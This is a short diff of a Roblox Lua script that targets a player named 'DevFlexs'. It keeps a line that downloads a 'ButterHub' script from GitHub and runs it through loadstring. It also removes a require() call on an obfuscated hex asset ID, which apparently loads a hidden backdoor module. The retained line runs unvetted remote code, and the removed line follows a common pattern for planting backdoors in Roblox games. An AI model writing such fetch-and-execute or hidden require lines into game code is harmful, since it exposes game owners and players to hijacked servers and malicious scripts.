@@ -3,7 +3,6 @@ if game.Players:FindFirstChild("DevFlexs") then
 ---game.Players["DevFlexs"].Character.Head.NameTag.NameFln.Text = ""
 
 ---game.Players["DevFlexs"].Character.Head.NameTag.NameFln.TextColor3 = Color3.new(1, 0, 0)
-require(0x22330bb15).Hotladiesinyourarea("DevFlexs")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ButterHub/ButterHub/main/ButterHubSource.lua"), true)()
 
 
